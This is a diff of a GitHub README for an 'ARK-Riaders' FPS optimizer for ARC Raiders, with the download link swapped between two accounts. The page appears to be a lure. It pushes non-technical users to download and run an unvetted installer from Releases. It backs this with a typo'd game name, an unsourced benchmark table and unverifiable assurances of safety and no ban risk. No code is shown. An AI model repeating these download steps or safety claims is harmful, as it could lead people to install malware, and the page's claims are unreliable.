@@ -1,68 +1,85 @@
-# 🚀 ARK-Riaders-FPS-Optimizer-Performance - Optimize you gameplay 
+# ⚙️ ARK-Riaders-FPS-Optimizer-Performance - Improve Your Game Frame Rates Easily
 
-## 🚀 Getting Started
+[![Download Performance Tool](https://img.shields.io/badge/Download-Performance_Tool-blue?style=for-the-badge)](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance)
 
-Welcome to Open-source performance project for ARC Raiders, ensuring smoother gameplay, reduced input lag and enhanced FPS. You do not need any technical skills to use this software.
+## 🎯 About This Project
 
-<img width="299" height="168" alt="image" src="https://github.com/user-attachments/assets/a564f946-8ce0-439d-8a9b-a7e3f7ab4b62" />
+ARK-Riaders-FPS-Optimizer-Performance is an open-source tool built to help you get the most out of your hardware. If you notice stuttering or slow movement while playing ARC Raiders, this software provides a simple way to adjust your system. It focuses on reducing input lag and increasing your frames per second. By streamlining background processes and optimizing graphics settings, it ensures your hardware directs its full power toward your game.
 
-[Download ARK-Riaders-FPS-Optimizer-Performance](https://github.com/cordemuplait/ARK-Riaders-FPS-Optimizer-Performance/releases)
+## 🛠️ System Requirements
 
+Before you use this tool, ensure your computer meets these basic requirements:
 
-## 🔥 Features
-- **Unlock your PC potential**
-- **Fix input lag**
-- **Clean Memory**
-- **Remove junk files**
-- **Optimize ping**
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Any quad-core processor or better.
+- Memory: 8 GB of RAM minimum.
+- Graphics: A dedicated graphics card with at least 2 GB of memory.
+- Storage: 50 MB of free space for the tool.
+- Internet: A connection to download the tool.
 
-## 📊 Benchmark Results (Before/After)
+## 📥 Getting Started
 
-| PC Spec | Avg Stock | Avg Optimized | Stable FPS | Increase |
-| :--- | :---: | :---: | :---: | :---: |
-| **GTX 1650 / i3 10100f** | 35 | 65 | 60+ | **+85%** |
-| **RTX 3060 / R5 5600** | 50 | 95 | 90+ | **+90%** |
-| **RTX 4060 / i5 12400** | 65 | 120 | 115+ | **+84%** |
+Follow these steps to prepare your system and run the optimizer.
 
-You too can unlock the potential of your PC.
+1. Visit this page to download the latest setup file: [https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the most recent version link to download the installer file.
+4. Once the download finishes, open your "Downloads" folder.
+5. Double-click the file to start the installation process.
+6. Follow the instructions on the screen to finish the setup.
 
-## 📥 Download & Install
+## 🚀 How to Optimize Your Game
 
-To get started, [visit this page to download the latest version of ARK-Raiders-FPS-Optimizer-Perfotmance](https://github.com/cordemuplait/ARK-Riaders-FPS-Optimizer-Performance/releases).
+Once you install the tool, you can start the optimization process. This tool changes system settings to favor gaming performance.
 
-1. Go to the Releases page linked above.
-2. Choose the latest version available.
-3. Click on the download link for the installation file.
-4. Once downloaded, locate the file on your computer and double-click to run it.
+1. Open the "ARK-Riaders-FPS-Optimizer" shortcut from your desktop.
+2. Select the "Performance Mode" tab.
+3. Review the available options. The "Balanced" setting works well for most computers.
+4. Click the "Apply" button to save these changes to your system.
+5. You may need to restart your computer for these changes to take effect.
+6. Close the application before you start the game.
 
-## 📋 System Requirements
+## 🧩 Understanding the Features
 
-PC specifications for better optimization
+This tool addresses common performance bottlenecks found in many gaming sessions.
 
-- **Operating System:** Windows 10 or higher
-- **Processor:** Intel Core i5 or AMD equivalent
-- **RAM:** 8 GB minimum
-- **Graphics Card:** NVIDIA GeForce GTX 660 or AMD Radeon HD 7850
-- **Internet Connection:** Required for initial setup and optimization
+- Input Lag Reduction: The tool modifies how your mouse and keyboard communicate with your computer. This change makes your actions feel instant.
+- Frame Rate Stability: It limits background tasks that often trigger sudden drops in screen refresh rates. 
+- Resource Allocation: The software tells Windows to give priority to the game process while you play. This prevents other programs from stealing power from your game.
+- Graphics Tuning: It adjusts hidden display settings that the game menu might not show. These changes keep the game looking sharp while asking less from your graphics card.
 
-## ⚙️ How to Use
+## 🛡️ Safety and Troubleshooting
 
-1. **Run the Application:** 
-2. **Start ARC Raiders:** 
-3. **Configure Settings:** 
+This tool only changes configuration files. It does not delete personal files or change your private settings. You can reverse any changes you make.
 
-## 📞 Contact
+- If the game behaves in an unexpected way, open the tool again.
+- Look for the "Restore Defaults" button. 
+- Click this button to reset your computer to its original state.
+- If the tool fails to open, ensure you have the latest drivers for your graphics card installed. 
+- You do not need to keep the tool running while you play. Once you apply the settings, you can exit the program. 
 
-For support, please create an issue on the GitHub repository.
+## 📝 Common Questions
 
+Will this tool get me banned?
+No, the tool does not read game memory or change game files directly. It only changes system settings managed by Windows.
 
+Can I use this on a laptop?
+Yes, this software functions on both desktop and laptop computers. Ensure your laptop is plugged into a power source while playing, as high-performance modes use more electricity.
 
+Do I need to update the tool?
+Check the link periodically for new versions. Updates often include fixes for newer game patches or improvements in how the software manages system memory.
 
+Does this tool work with other games?
+While the tool carries the name of the project, the optimization methods apply to many other modern games. Feel free to use it for other titles if you notice similar performance issues on your machine.
 
+## 💡 Best Practices for High Performance
 
+Apart from using the tool, follow these steps to keep your frame rates high:
 
+1. Close web browsers and background apps before you open the game.
+2. Ensure your monitor connects directly to your graphics card, not the motherboard.
+3. Keep your display drivers updated through the software provided by your graphics card manufacturer.
+4. Clean your computer hardware of dust to prevent heat-related slowdowns.
+5. Set your Windows power plan to "High Performance" in your Control Panel.
 
-
-
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+This project remains open-source to ensure transparency. You can view the full source code and suggest improvements directly through the repository link provided at the top. Your feedback helps make the experience smoother for everyone.
